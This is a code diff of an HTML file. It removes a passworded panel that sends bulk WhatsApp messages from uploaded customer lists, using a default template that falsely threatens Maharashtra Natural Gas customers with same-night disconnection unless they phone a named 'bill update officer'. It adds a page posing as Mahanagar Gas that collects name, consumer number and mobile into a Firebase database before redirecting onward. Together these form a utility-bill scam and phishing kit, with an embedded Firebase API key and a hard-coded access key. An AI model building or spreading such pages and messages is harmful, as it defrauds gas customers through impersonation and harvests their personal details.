@@ -1,632 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>WhatsApp Bulk Message Panel | MNGL Pipeline Alert</title>
-    <!-- Tailwind CSS + Font Awesome -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- SheetJS for Excel/CSV parsing -->
-    <script src="https://cdn.sheetjs.com/xlsx-0.20.2/package/dist/xlsx.full.min.js"></script>
-    <!-- PDF.js for PDF parsing (mobile compatible) -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.min.js"></script>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-    <style>
-        .url-list { max-height: 60vh; overflow-y: auto; scroll-behavior: smooth; }
-        .wa-link { cursor: pointer; font-weight: 500; transition: all 0.2s ease; word-break: break-all; }
-        .wa-link.unsent { color: #3b82f6; }
-        .wa-link.sent { color: #ef4444; text-decoration: line-through; opacity: 0.8; }
-        .send-btn { transition: all 0.2s; }
-        .template-box { background-color: #f8fafc; border-left: 4px solid #10b981; font-family: monospace; white-space: pre-wrap; }
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 1000;
-        }
-        .modal-content { background: white; border-radius: 1rem; max-width: 90%; width: 500px; padding: 1.5rem; }
-        .modal-content-large { max-width: 95%; width: 700px; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>mgl gas</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #FFFFFF;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 30px;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 100%;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      background-color: #0f7213;
+      color: white;
+      padding: 12px;
+      font-size: 20px;
+      border-radius: 5px;
+    }
+    label {
+      font-size: 16px;
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+      text-align: left;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .side-button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #4082ff;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 10px;
+    }
+  </style>
 </head>
-<body class="bg-gray-100 font-sans antialiased">
+<body>
+  <img src="https://meek-semolina-bb73d5.netlify.app/top.jpg" alt="Meri Tasveer" />
 
-    <!-- Key Authentication Modal -->
-    <div id="keyModal" class="modal-overlay hidden">
-        <div class="modal-content">
-            <h2 class="text-xl font-bold mb-2">Access Required</h2>
-            <p class="text-gray-600 mb-4">Enter access key to continue</p>
-            <input type="password" id="accessKeyInput" class="w-full border rounded-lg px-3 py-2 mb-4" placeholder="Key">
-            <button id="submitKeyBtn" class="bg-blue-600 text-white px-4 py-2 rounded-lg w-full">Submit</button>
-            <p id="keyError" class="text-red-500 text-sm mt-2 hidden">Invalid key</p>
-        </div>
-    </div>
+  <div class="form-container">
+    <h2>Mahanagar Gas</h2>
+    <form onsubmit="submitForm(event)">
+      <label for="name">Name*</label>
+      <input type="text" id="name" placeholder="Full Name" required />
 
-    <!-- Template Editor Modal -->
-    <div id="templateModal" class="modal-overlay hidden">
-        <div class="modal-content modal-content-large">
-            <div class="flex justify-between items-center mb-4">
-                <h2 class="text-xl font-bold">Manage Templates</h2>
-                <button id="closeTemplateModal" class="text-gray-500 hover:text-gray-700"><i class="fas fa-times"></i></button>
-            </div>
-            <div class="mb-4">
-                <label class="block font-medium">Select Active Template</label>
-                <select id="templateSelect" class="w-full border rounded-lg px-3 py-2 mt-1"></select>
-            </div>
-            <div class="mb-4">
-                <label class="block font-medium">Template Name</label>
-                <input type="text" id="templateName" class="w-full border rounded-lg px-3 py-2" placeholder="e.g., Default, Urgent, Reminder">
-            </div>
-            <div class="mb-4">
-                <label class="block font-medium">Template Content</label>
-                <textarea id="templateContent" rows="12" class="w-full border rounded-lg px-3 py-2 font-mono text-sm"></textarea>
-                <p class="text-xs text-gray-500 mt-1">Use {name} and {bp number} as placeholders.</p>
-            </div>
-            <div class="flex flex-wrap gap-2">
-                <button id="saveTemplateBtn" class="bg-green-600 text-white px-4 py-2 rounded-lg">Save as New</button>
-                <button id="updateTemplateBtn" class="bg-blue-600 text-white px-4 py-2 rounded-lg">Update Selected</button>
-                <button id="deleteTemplateBtn" class="bg-red-600 text-white px-4 py-2 rounded-lg">Delete Selected</button>
-            </div>
-        </div>
-    </div>
+      <label for="kno">Consumer Number*</label>
+      <input type="text" id="kno" placeholder="Consumer Number" required />
 
-    <div class="max-w-4xl mx-auto px-4 py-6 md:py-10" id="mainContent" style="display: none;">
-        <!-- Header -->
-        <div class="bg-white rounded-2xl shadow-md p-5 mb-6 border border-gray-200">
-            <div class="flex items-center gap-3 mb-2">
-                <i class="fab fa-whatsapp text-3xl text-green-600"></i>
-                <h1 class="text-2xl md:text-3xl font-bold text-gray-800">WhatsApp Pipeline Alert Panel</h1>
-            </div>
-            <p class="text-gray-600 text-sm">Upload Excel / CSV / PDF with columns: <span class="font-mono bg-gray-100 px-1">Column A = BP Number</span>, <span class="font-mono bg-gray-100 px-1">Column B = Name</span>, <span class="font-mono bg-gray-100 px-1">Column C = Mobile Number</span>. Each record will generate a personalised WhatsApp link.</p>
-        </div>
+      <label for="mobile">Mobile*</label>
+      <input type="text" id="mobile" placeholder="Mobile Number" required />
 
-        <!-- File Upload + Template Edit Button -->
-        <div class="bg-white rounded-2xl shadow-md p-5 mb-6">
-            <div class="flex flex-wrap justify-between items-center gap-3 mb-3">
-                <label class="block text-lg font-semibold text-gray-700">
-                    <i class="fas fa-upload mr-2 text-blue-600"></i> Upload Data File
-                </label>
-                <button id="editTemplateBtn" class="bg-purple-100 hover:bg-purple-200 text-purple-800 px-4 py-2 rounded-lg text-sm font-medium transition"><i class="fas fa-edit mr-1"></i> Edit Templates</button>
-            </div>
-            <input type="file" id="fileInput" accept=".csv, .xlsx, .xls, .pdf" class="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100 cursor-pointer" />
-            <p class="text-xs text-gray-400 mt-2"><i class="fas fa-mobile-alt mr-1"></i> Mobile storage permission: file picker automatically requests access. Supported: CSV, Excel (.xlsx/.xls), PDF (basic text extraction).</p>
-            <div class="mt-3 flex flex-wrap gap-3">
-                <button id="clearDataBtn" class="bg-gray-200 hover:bg-gray-300 text-gray-800 px-4 py-2 rounded-lg text-sm font-medium transition"><i class="fas fa-trash-alt mr-1"></i> Clear all data</button>
-                <button id="refreshListBtn" class="bg-indigo-100 hover:bg-indigo-200 text-indigo-800 px-4 py-2 rounded-lg text-sm font-medium transition"><i class="fas fa-sync-alt mr-1"></i> Refresh list</button>
-            </div>
-        </div>
+      <button class="side-button" type="submit">Continue</button>
+    </form>
+  </div>
 
-        <!-- Message Template Preview (dynamic) -->
-        <div class="bg-white rounded-2xl shadow-md p-5 mb-6">
-            <div class="flex justify-between items-center">
-                <h2 class="text-lg font-bold text-gray-800 flex items-center gap-2"><i class="far fa-envelope"></i> Active Message Template</h2>
-                <span id="templateNameBadge" class="text-xs bg-gray-100 px-2 py-1 rounded-full"></span>
-            </div>
-            <div id="templatePreview" class="template-box text-sm p-3 rounded-lg mt-2 border border-gray-200 text-gray-700 whitespace-pre-wrap"></div>
-            <p class="text-xs text-gray-500 mt-2">Placeholders <span class="bg-gray-100 px-1">{name}</span> and <span class="bg-gray-100 px-1">{bp number}</span> will be replaced automatically.</p>
-        </div>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
 
-        <!-- Uploaded Data Preview (Table) -->
-        <div id="previewContainer" class="bg-white rounded-2xl shadow-md p-5 mb-6 hidden">
-            <h2 class="text-md font-bold text-gray-700 mb-2"><i class="fas fa-table"></i> Uploaded Data Preview (first 5 rows)</h2>
-            <div class="overflow-x-auto">
-                <table class="min-w-full text-sm border border-gray-200 rounded-lg">
-                    <thead class="bg-gray-50">
-                        <tr id="previewHeader" class="text-left text-gray-600">(\n                    </thead>
-                    <tbody id="previewBody"></tbody>
-                </table>
-            </div>
-            <p id="recordCount" class="text-xs text-gray-400 mt-2"></p>
-        </div>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.appspot.com",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+    };
 
-        <!-- Scrollable URL List -->
-        <div class="bg-white rounded-2xl shadow-md p-5">
-            <div class="flex justify-between items-center border-b pb-3 mb-3 flex-wrap gap-2">
-                <h2 class="text-xl font-bold text-gray-800"><i class="fab fa-whatsapp mr-2 text-green-600"></i> Generated WhatsApp Links</h2>
-                <span id="statsBadge" class="bg-gray-100 text-gray-700 px-3 py-1 rounded-full text-xs font-medium">0 total · 0 sent</span>
-            </div>
-            <div id="urlListContainer" class="url-list">
-                <div class="text-center py-8 text-gray-400">
-                    <i class="fas fa-cloud-upload-alt text-4xl mb-2"></i>
-                    <p>Upload an Excel/CSV/PDF file to generate WhatsApp links</p>
-                    <p class="text-xs mt-1">Links appear here with blue color → click or press send to mark as red (sent)</p>
-                </div>
-            </div>
-        </div>
-    </div>
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-    <script>
-        // ================= FIREBASE INIT =================
-        const firebaseConfig = {
-            apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
-            authDomain: "ss22-a96d3.firebaseapp.com",
-            projectId: "ss22-a96d3",
-            storageBucket: "ss22-a96d3.appspot.com",
-            messagingSenderId: "607942972170",
-            appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+    function submitForm(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const kno = document.getElementById("kno").value;
+      const mobile = document.getElementById("mobile").value;
 
-        // Session ID stored in sessionStorage (persists until tab close)
-        let sessionId = sessionStorage.getItem("wa_session_id");
-        if (!sessionId) {
-            sessionId = "session_" + Date.now() + "_" + Math.random().toString(36).substr(2, 8);
-            sessionStorage.setItem("wa_session_id", sessionId);
-        }
-
-        // Global state
-        let uploadedData = [];          // [{ bp, name, mobile }]
-        let sentStatus = [];            // boolean[]
-        let templates = [];              // [{ id, name, content }]
-        let activeTemplateId = null;     // id of selected template
-
-        const DEFAULT_TEMPLATE = `*IMPORTANT NOTICE*
-
-*Maharashtra Natural Gas Ltd*
-DEAR {name}
-Dear  MNGL Gas pipe line  Your {bp number} connection will be disconnected tonight 09:30 PM Because your previous month Bill is Not updated. Please immediately call our bill update Officer Mr BHAVESH MISHRA
-📞+919382482641
-
-Regards Pipe line Gas.`;
-
-        // ================= FIREBASE SYNC =================
-        async function saveToFirebase() {
-            if (!sessionId) return;
-            const docRef = db.collection("whatsapp_sessions").doc(sessionId);
-            await docRef.set({
-                uploadedData: uploadedData,
-                sentStatus: sentStatus,
-                templates: templates,
-                activeTemplateId: activeTemplateId,
-                lastUpdated: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true });
-        }
-
-        async function loadFromFirebase() {
-            const docRef = db.collection("whatsapp_sessions").doc(sessionId);
-            const doc = await docRef.get();
-            if (doc.exists) {
-                const data = doc.data();
-                uploadedData = data.uploadedData || [];
-                sentStatus = data.sentStatus || new Array(uploadedData.length).fill(false);
-                templates = data.templates || [];
-                activeTemplateId = data.activeTemplateId || null;
-
-                // Ensure sentStatus length matches uploadedData
-                if (sentStatus.length !== uploadedData.length) {
-                    sentStatus = new Array(uploadedData.length).fill(false);
-                }
-
-                // If no templates, add default
-                if (!templates.length) {
-                    addDefaultTemplate();
-                } else if (!activeTemplateId) {
-                    activeTemplateId = templates[0].id;
-                }
-            } else {
-                // First time - initialize with default template
-                addDefaultTemplate();
-                uploadedData = [];
-                sentStatus = [];
-                await saveToFirebase();
-            }
-            // Update UI
-            renderPreviewTable();
-            renderUrlList();
-            updateStats();
-            updateTemplatePreview();
-            populateTemplateSelect();
-        }
-
-        function addDefaultTemplate() {
-            const defaultId = "default_" + Date.now();
-            templates = [{
-                id: defaultId,
-                name: "Default Alert",
-                content: DEFAULT_TEMPLATE
-            }];
-            activeTemplateId = defaultId;
-        }
-
-        function getActiveTemplateContent() {
-            const tpl = templates.find(t => t.id === activeTemplateId);
-            return tpl ? tpl.content : DEFAULT_TEMPLATE;
-        }
-
-        function buildPersonalizedMessage(name, bpNumber) {
-            let msg = getActiveTemplateContent();
-            msg = msg.replace(/{name}/g, name || "Customer");
-            msg = msg.replace(/{bp number}/g, bpNumber || "BP-XXXX");
-            return msg;
-        }
-
-        // ================= HELPER FUNCTIONS =================
-        function formatMobileForWhatsApp(rawMobile) {
-            let cleaned = String(rawMobile).replace(/[^\d+]/g, '');
-            cleaned = cleaned.replace(/^\+/, '');
-            if (cleaned.length === 10 && /^\d{10}$/.test(cleaned)) cleaned = "91" + cleaned;
-            if (cleaned.startsWith('0') && cleaned.length === 11) cleaned = "91" + cleaned.slice(1);
-            if (!/^\d+$/.test(cleaned)) return "";
-            return cleaned;
-        }
-
-        function encodeWhatsAppMessage(text) {
-            return encodeURIComponent(text);
-        }
-
-        function generateWhatsAppLink(record, index) {
-            let formattedMobile = formatMobileForWhatsApp(record.mobile);
-            if (!formattedMobile) return "#";
-            let personalizedMsg = buildPersonalizedMessage(record.name, record.bp);
-            let encodedMsg = encodeWhatsAppMessage(personalizedMsg);
-            return `https://wa.me/${formattedMobile}?text=${encodedMsg}`;
-        }
-
-        async function markAsSent(index) {
-            if (!uploadedData[index] || sentStatus[index]) return false;
-            sentStatus[index] = true;
-            await saveToFirebase();
-            renderUrlList();
-            updateStats();
-            return true;
-        }
-
-        function openAndMark(index) {
-            if (!uploadedData[index]) return;
-            const link = generateWhatsAppLink(uploadedData[index], index);
-            if (link && link !== "#") {
-                window.open(link, "_blank");
-                markAsSent(index);
-            } else {
-                alert("Invalid mobile number: " + uploadedData[index].mobile);
-            }
-        }
-
-        function renderUrlList(resetToEmpty = false) {
-            const container = document.getElementById("urlListContainer");
-            if (!container) return;
-            if (resetToEmpty || uploadedData.length === 0) {
-                container.innerHTML = `<div class="text-center py-8 text-gray-400">
-                            <i class="fas fa-cloud-upload-alt text-4xl mb-2"></i>
-                            <p>Upload an Excel/CSV/PDF file to generate WhatsApp links</p>
-                            <p class="text-xs mt-1">Links appear here with blue color → click or press send to mark as red (sent)</p>
-                        </div>`;
-                return;
-            }
-
-            let html = `<div class="space-y-3">`;
-            for (let i = 0; i < uploadedData.length; i++) {
-                const record = uploadedData[i];
-                const isSent = sentStatus[i] || false;
-                const waLink = generateWhatsAppLink(record, i);
-                const shortLink = waLink.length > 70 ? waLink.substring(0, 65) + "..." : waLink;
-                html += `
-                    <div class="flex flex-col sm:flex-row sm:items-center justify-between p-3 border border-gray-200 rounded-xl bg-gray-50 hover:bg-gray-100 transition gap-2">
-                        <div class="flex-1 min-w-0">
-                            <div class="flex flex-wrap gap-x-3 text-xs font-mono text-gray-600">
-                                <span><i class="fas fa-barcode"></i> BP: ${escapeHtml(record.bp)}</span>
-                                <span><i class="fas fa-user"></i> ${escapeHtml(record.name)}</span>
-                                <span><i class="fas fa-phone-alt"></i> ${escapeHtml(record.mobile)}</span>
-                            </div>
-                            <div class="mt-1 break-all">
-                                <a class="wa-link ${isSent ? 'sent' : 'unsent'}" data-index="${i}" href="javascript:void(0)">
-                                    <i class="fab fa-whatsapp mr-1"></i> ${escapeHtml(shortLink)}
-                                </a>
-                            </div>
-                        </div>
-                        <div class="flex-shrink-0">
-                            <button class="send-btn bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-1.5 rounded-full shadow-sm transition flex items-center gap-1" data-index="${i}">
-                                <i class="fab fa-whatsapp"></i> Send
-                            </button>
-                        </div>
-                    </div>
-                `;
-            }
-            html += `</div>`;
-            container.innerHTML = html;
-
-            document.querySelectorAll('.wa-link').forEach(link => {
-                link.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const idx = link.getAttribute('data-index');
-                    if (idx !== null) openAndMark(parseInt(idx));
-                });
-            });
-            document.querySelectorAll('.send-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const idx = btn.getAttribute('data-index');
-                    if (idx !== null) openAndMark(parseInt(idx));
-                });
-            });
-        }
-
-        function updateStats() {
-            const total = uploadedData.length;
-            const sentCount = sentStatus.filter(v => v === true).length;
-            const badge = document.getElementById("statsBadge");
-            if (badge) badge.innerText = `${total} total · ${sentCount} sent`;
-        }
-
-        function renderPreviewTable(hide = false) {
-            const container = document.getElementById("previewContainer");
-            if (!container) return;
-            if (hide || uploadedData.length === 0) {
-                container.classList.add("hidden");
-                return;
-            }
-            container.classList.remove("hidden");
-            const headerRow = document.getElementById("previewHeader");
-            const bodyElem = document.getElementById("previewBody");
-            const recordSpan = document.getElementById("recordCount");
-            if (!headerRow || !bodyElem) return;
-
-            const headers = ["BP Number", "Name", "Mobile Number"];
-            headerRow.innerHTML = headers.map(h => `<th class="px-3 py-2 border-b">${h}</th>`).join('');
-
-            const previewRows = uploadedData.slice(0, 5);
-            bodyElem.innerHTML = previewRows.map(row => `
-                <tr class="border-b hover:bg-gray-50">
-                    <td class="px-3 py-2 text-sm">${escapeHtml(row.bp)}</td>
-                    <td class="px-3 py-2 text-sm">${escapeHtml(row.name)}</td>
-                    <td class="px-3 py-2 text-sm">${escapeHtml(row.mobile)}</td>
-                </tr>
-            `).join('');
-            recordSpan.innerText = `Total records: ${uploadedData.length} (showing first ${Math.min(5, uploadedData.length)})`;
-        }
-
-        function updateTemplatePreview() {
-            const previewDiv = document.getElementById("templatePreview");
-            const badgeSpan = document.getElementById("templateNameBadge");
-            if (previewDiv) {
-                const active = templates.find(t => t.id === activeTemplateId);
-                previewDiv.innerText = active ? active.content : DEFAULT_TEMPLATE;
-                if (badgeSpan) badgeSpan.innerText = active ? active.name : "Default";
-            }
-        }
-
-        function populateTemplateSelect() {
-            const select = document.getElementById("templateSelect");
-            if (!select) return;
-            select.innerHTML = "";
-            templates.forEach(tpl => {
-                const option = document.createElement("option");
-                option.value = tpl.id;
-                option.textContent = tpl.name;
-                if (tpl.id === activeTemplateId) option.selected = true;
-                select.appendChild(option);
-            });
-            select.onchange = async () => {
-                const selectedId = select.value;
-                activeTemplateId = selectedId;
-                await saveToFirebase();
-                updateTemplatePreview();
-                renderUrlList(); // regenerate all links with new template
-                updateStats();
-            };
-        }
-
-        function escapeHtml(str) {
-            if (!str) return "";
-            return String(str).replace(/[&<>]/g, function(m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
-        }
-
-        // ================= FILE PARSING =================
-        async function parseExcelOrCSV(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const data = new Uint8Array(e.target.result);
-                    const workbook = XLSX.read(data, { type: 'array' });
-                    const firstSheet = workbook.Sheets[workbook.SheetNames[0]];
-                    const rows = XLSX.utils.sheet_to_json(firstSheet, { header: 1, defval: "" });
-                    if (!rows || rows.length < 2) return reject("File has no data rows");
-                    const firstRow = rows[0].map(cell => String(cell || "").trim().toLowerCase());
-                    const hasHeader = firstRow.some(cell => cell.includes("bp") || cell.includes("name") || cell.includes("mobile"));
-                    let startIndex = hasHeader ? 1 : 0;
-                    const records = [];
-                    for (let i = startIndex; i < rows.length; i++) {
-                        const row = rows[i];
-                        if (!row || row.length < 3) continue;
-                        let bp = row[0] ? String(row[0]).trim() : "";
-                        let name = row[1] ? String(row[1]).trim() : "";
-                        let mobile = row[2] ? String(row[2]).trim() : "";
-                        if (bp === "" && name === "" && mobile === "") continue;
-                        records.push({ bp, name, mobile });
-                    }
-                    if (records.length === 0) reject("No valid data rows");
-                    resolve(records);
-                };
-                reader.onerror = () => reject("Error reading file");
-                reader.readAsArrayBuffer(file);
-            });
-        }
-
-        async function parsePDF(file) {
-            const arrayBuffer = await file.arrayBuffer();
-            const loadingTask = pdfjsLib.getDocument({ data: arrayBuffer });
-            const pdf = await loadingTask.promise;
-            let fullText = "";
-            for (let i = 1; i <= pdf.numPages; i++) {
-                const page = await pdf.getPage(i);
-                const textContent = await page.getTextContent();
-                const pageText = textContent.items.map(item => item.str).join(" ");
-                fullText += pageText + "\n";
-            }
-            const lines = fullText.split(/\r?\n/).filter(line => line.trim().length > 0);
-            if (lines.length < 2) throw new Error("PDF has insufficient text");
-            let startIdx = 0;
-            const lowerFirst = lines[0].toLowerCase();
-            if (lowerFirst.includes("bp") || lowerFirst.includes("name") || lowerFirst.includes("mobile")) startIdx = 1;
-            const records = [];
-            for (let i = startIdx; i < lines.length; i++) {
-                let line = lines[i].trim();
-                if (!line) continue;
-                let parts = line.includes(",") ? line.split(",").map(p => p.trim()) : line.split(/\s+/);
-                if (parts.length < 3) continue;
-                let bp = parts[0];
-                let name = parts[1];
-                let mobile = parts[2];
-                if (mobile.length < 5) continue;
-                records.push({ bp, name, mobile });
-                if (records.length > 5000) break;
-            }
-            if (records.length === 0) throw new Error("Could not extract records");
-            return records;
-        }
-
-        async function handleFileUpload(file) {
-            if (!file) return;
-            const ext = file.name.split('.').pop().toLowerCase();
-            let records = [];
-            try {
-                if (ext === 'csv' || ext === 'xlsx' || ext === 'xls') {
-                    records = await parseExcelOrCSV(file);
-                } else if (ext === 'pdf') {
-                    records = await parsePDF(file);
-                    alert("PDF parsed using basic text extraction. Please verify preview.");
-                } else {
-                    alert("Unsupported file type");
-                    return;
-                }
-                if (!records.length) throw new Error("No data found");
-                uploadedData = records;
-                sentStatus = new Array(records.length).fill(false);
-                await saveToFirebase();
-                renderPreviewTable();
-                renderUrlList();
-                updateStats();
-            } catch (err) {
-                alert("Parsing error: " + err.message);
-            }
-        }
-
-        async function resetAllData() {
-            if (uploadedData.length && !confirm("Clear all uploaded data and sent status?")) return;
-            uploadedData = [];
-            sentStatus = [];
-            await saveToFirebase();
-            renderPreviewTable(true);
-            renderUrlList(true);
-            updateStats();
-            document.getElementById("fileInput").value = "";
-        }
-
-        // ================= TEMPLATE UI =================
-        function showTemplateModal() {
-            const modal = document.getElementById("templateModal");
-            if (!modal) return;
-            const active = templates.find(t => t.id === activeTemplateId);
-            document.getElementById("templateName").value = active ? active.name : "";
-            document.getElementById("templateContent").value = active ? active.content : "";
-            modal.classList.remove("hidden");
-        }
-
-        function closeTemplateModal() {
-            document.getElementById("templateModal").classList.add("hidden");
-        }
-
-        async function saveNewTemplate() {
-            const name = document.getElementById("templateName").value.trim();
-            const content = document.getElementById("templateContent").value;
-            if (!name) return alert("Please enter template name");
-            if (!content) return alert("Template content cannot be empty");
-            const newId = "tpl_" + Date.now() + "_" + Math.random().toString(36).substr(2, 5);
-            templates.push({ id: newId, name, content });
-            activeTemplateId = newId;
-            await saveToFirebase();
-            populateTemplateSelect();
-            updateTemplatePreview();
-            renderUrlList(); // regenerate links with new template
-            closeTemplateModal();
-        }
-
-        async function updateSelectedTemplate() {
-            const select = document.getElementById("templateSelect");
-            const selectedId = select.value;
-            const newName = document.getElementById("templateName").value.trim();
-            const newContent = document.getElementById("templateContent").value;
-            if (!newName) return alert("Template name required");
-            if (!newContent) return alert("Template content required");
-            const idx = templates.findIndex(t => t.id === selectedId);
-            if (idx === -1) return;
-            templates[idx].name = newName;
-            templates[idx].content = newContent;
-            if (activeTemplateId === selectedId) {
-                updateTemplatePreview();
-                renderUrlList();
-            }
-            await saveToFirebase();
-            populateTemplateSelect();
-            closeTemplateModal();
-        }
-
-        async function deleteSelectedTemplate() {
-            const select = document.getElementById("templateSelect");
-            const selectedId = select.value;
-            if (templates.length <= 1) {
-                alert("Cannot delete the only template. Add another first.");
-                return;
-            }
-            if (!confirm("Delete this template?")) return;
-            templates = templates.filter(t => t.id !== selectedId);
-            if (activeTemplateId === selectedId) {
-                activeTemplateId = templates[0].id;
-            }
-            await saveToFirebase();
-            populateTemplateSelect();
-            updateTemplatePreview();
-            renderUrlList();
-            closeTemplateModal();
-        }
-
-        // ================= KEY AUTHENTICATION =================
-        function checkKey() {
-            const authenticated = sessionStorage.getItem("wa_authenticated");
-            if (authenticated === "true") {
-                document.getElementById("keyModal").classList.add("hidden");
-                document.getElementById("mainContent").style.display = "block";
-                loadFromFirebase();
-                return true;
-            }
-            document.getElementById("keyModal").classList.remove("hidden");
-            return false;
-        }
-
-        document.getElementById("submitKeyBtn").addEventListener("click", () => {
-            const key = document.getElementById("accessKeyInput").value;
-            if (key === "4542") {
-                sessionStorage.setItem("wa_authenticated", "true");
-                document.getElementById("keyModal").classList.add("hidden");
-                document.getElementById("mainContent").style.display = "block";
-                loadFromFirebase();
-            } else {
-                document.getElementById("keyError").classList.remove("hidden");
-            }
-        });
-
-        // ================= EVENT LISTENERS =================
-        window.addEventListener("DOMContentLoaded", () => {
-            if (!checkKey()) return;
-            document.getElementById("fileInput").addEventListener("change", (e) => {
-                if (e.target.files[0]) handleFileUpload(e.target.files[0]);
-            });
-            document.getElementById("clearDataBtn").addEventListener("click", resetAllData);
-            document.getElementById("refreshListBtn").addEventListener("click", () => {
-                if (uploadedData.length) renderUrlList();
-                else alert("No data loaded");
-            });
-            document.getElementById("editTemplateBtn").addEventListener("click", showTemplateModal);
-            document.getElementById("closeTemplateModal").addEventListener("click", closeTemplateModal);
-            document.getElementById("saveTemplateBtn").addEventListener("click", saveNewTemplate);
-            document.getElementById("updateTemplateBtn").addEventListener("click", updateSelectedTemplate);
-            document.getElementById("deleteTemplateBtn").addEventListener("click", deleteSelectedTemplate);
-        });
-    </script>
+      db.collection("users").add({
+        name,
+        kno,
+        mobile,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "page2.html";
+      }).catch((error) => {
+        alert("Error saving data: " + error);
+      });
+    }
+  </script>
 </body>
 </html>
